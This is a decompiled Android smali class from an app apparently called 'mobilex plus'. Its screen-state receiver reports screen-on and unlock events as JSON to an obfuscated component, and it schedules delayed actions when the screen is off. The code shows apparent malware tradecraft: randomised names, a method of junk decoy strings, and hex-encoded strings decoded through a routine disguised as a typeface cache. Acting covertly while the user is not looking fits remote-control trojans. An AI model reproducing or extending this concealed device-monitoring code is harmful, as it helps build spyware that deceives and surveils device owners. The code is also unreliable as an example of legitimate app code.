.class public final Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;
.super Landroid/content/BroadcastReceiver;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final synthetic w9sT1Swbhx3hs:I


# instance fields
.field public final synthetic dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;


# direct methods
.method public constructor <init>(Lv/s/RWY6BVSB0XxPbw;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 2
    .line 3
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method private static synthetic xcxioutn()V
    .locals 1

    const-string v0, "onStart"

    const-string v0, "net.manager.oxjmu"

    const-string v0, "TAG"

    const-string v0, "swipe"

    const-string v0, "ISO-8859-1"

    const-string v0, "auto"

    const-string v0, "onDestroy"

    const-string v0, "Error"

    const-string v0, "net.ui.lwfmcmqpx"

    const-string v0, "io.manager.dfuruusk"

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5

    .line 1
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const-string v1, "android.intent.action.SCREEN_ON"

    .line 6
    .line 7
    invoke-static {v0, v1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 8
    .line 9
    .line 10
    move-result v0

    .line 11
    if-nez v0, :cond_1

    .line 12
    .line 13
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 14
    .line 15
    .line 16
    move-result-object p2

    nop

    .line 17
    const-string v0, "android.intent.action.USER_PRESENT"

    .line 18
    .line 19
    invoke-static {p2, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 20
    .line 21
    .line 22
    move-result p2

    nop

    .line 23
    if-eqz p2, :cond_0

    .line 24
    .line 25
    goto/16 :goto_0

    .line 26
    :cond_0
    const/4 p2, 0x0

    .line 27
    goto/16 :goto_1

    .line 28
    :cond_1
    :goto_0
    const/4 p2, 0x1

    nop

    nop

    .line 29
    :goto_1
    iget-object v0, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 30
    .line 31
    new-instance v1, Lorg/json/JSONObject;

    .line 32
    .line 33
    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 34
    .line 35
    .line 36
    const-string v2, "0037006F004B0082"

    .line 37
    .line 38
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 39
    .line 40
    .line 41
    move-result-object v2

    .line 42
    const-string v3, "003000750049008200F500B100ED00B400370077004F0082"

    .line 43
    .line 44
    const-string v4, "003000750049008200F500B100ED00A8002D"

    .line 45
    .line 46
    invoke-static {v3, v1, v2, v4, p2}, Lv/s/Y9mRyRdkl5FOcwb66V6;->Qrz92kRPw4GcghAc(Ljava/lang/String;Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 47
    .line 48
    .line 49
    invoke-virtual {v0, v1}, Lv/s/RWY6BVSB0XxPbw;->H9XlUr4OeMJFiXK(Lorg/json/JSONObject;)V

    .line 50
    .line 51
    .line 52
    sget-object v0, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    .line 53
    .line 54
    const-string v0, "001000750049008200F500B1009200B400370077004F008200B000BD00C000A8002200720058008600E300AB008800E7003000750049008200F500B100ED00A8002D002B"

    nop

    nop

    .line 55
    .line 56
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 57
    .line 58
    .line 59
    if-nez p2, :cond_2

    .line 60
    .line 61
    iget-object p2, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 62
    .line 63
    iget-boolean p2, p2, Lv/s/RWY6BVSB0XxPbw;->YIgR6F2ZXmLx2ul:Z

    .line 64
    .line 65
    if-eqz p2, :cond_2

    .line 66
    .line 67
    iget-object p2, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 68
    .line 69
    iget-boolean p2, p2, Lv/s/RWY6BVSB0XxPbw;->XiR1pIn5878vVWd:Z

    .line 70
    .line 71
    if-eqz p2, :cond_2

    .line 72
    .line 73
    const-string p2, "00280073005E009700C300BC00C000A2002600780074008900AA00FF00D300B2003700790016009000F100B400DB00A900240036005A008100E400BA00C000E700100055006900A200D5009100ED008800050050"

    .line 74
    .line 75
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    iget-object p2, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 79
    .line 80
    iget-object p2, p2, Lv/s/RWY6BVSB0XxPbw;->nQilHWaqS401ZtR:Landroid/os/Handler;

    .line 81
    .line 82
    new-instance v0, Lv/s/jdOQeRk37T35X5xKW1P;

    .line 83
    .line 84
    const/16 v1, 0xb

    nop

    .line 85
    .line 86
    invoke-direct {v0, v1}, Lv/s/jdOQeRk37T35X5xKW1P;-><init>(I)V

    .line 87
    .line 88
    .line 89
    const-wide/16 v1, 0xc8

    .line 90
    .line 91
    invoke-virtual {p2, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 92
    .line 93
    .line 94
    iget-object p2, p0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->dDIMxZXP1V8HdM:Lv/s/RWY6BVSB0XxPbw;

    .line 95
    .line 96
    iget-object p2, p2, Lv/s/RWY6BVSB0XxPbw;->nQilHWaqS401ZtR:Landroid/os/Handler;

    .line 97
    .line 98
    new-instance v0, Lv/s/hzCVl0f866ksvpzUUql;

    nop

    .line 99
    .line 100
    const v1, 0xa

    nop

    .line 101
    .line 102
    invoke-direct {v0, v1, p1}, Lv/s/hzCVl0f866ksvpzUUql;-><init>(ILjava/lang/Object;)V

    .line 103
    .line 104
    .line 105
    const-wide/16 v1, 0x5dc

    .line 106
    .line 107
    invoke-virtual {p2, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 108
    .line 109
    .line 110
    :cond_2
    return-void
.end method
